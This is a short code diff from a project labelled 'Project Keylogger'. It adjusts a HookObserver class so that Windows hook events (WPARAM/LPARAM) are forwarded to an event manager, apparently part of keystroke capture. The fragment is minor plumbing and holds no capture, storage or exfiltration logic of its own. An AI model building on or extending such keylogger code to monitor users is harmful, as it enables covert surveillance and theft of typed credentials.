@@ -2,7 +2,7 @@
  *						Project Keylogger
  */
 
-
+#include				<iostream>
 #include				"keylogger_dll/HookObserver.h"
 
 /**
@@ -13,7 +13,7 @@
 /**
  * @param EventManager&
  */
-HookObserver::HookObserver(EventManager& eventManager) : _eventManager(eventManager) {
+HookObserver::HookObserver(const EventManager& eventManager) : _eventManager(eventManager) {
 }
 
 /**
@@ -22,6 +22,7 @@ HookObserver::HookObserver(EventManager& eventManager) : _eventManager(eventMana
  * @param WPARAM
  * @return void
  */
-void						HookObserver::update(const LPARAM lparam, const WPARAM wparam) const {
+void						HookObserver::update(const WPARAM wParam, const LPARAM lParam) const {
+	_eventManager.handleEvent(wParam, lParam);
     return;
 }
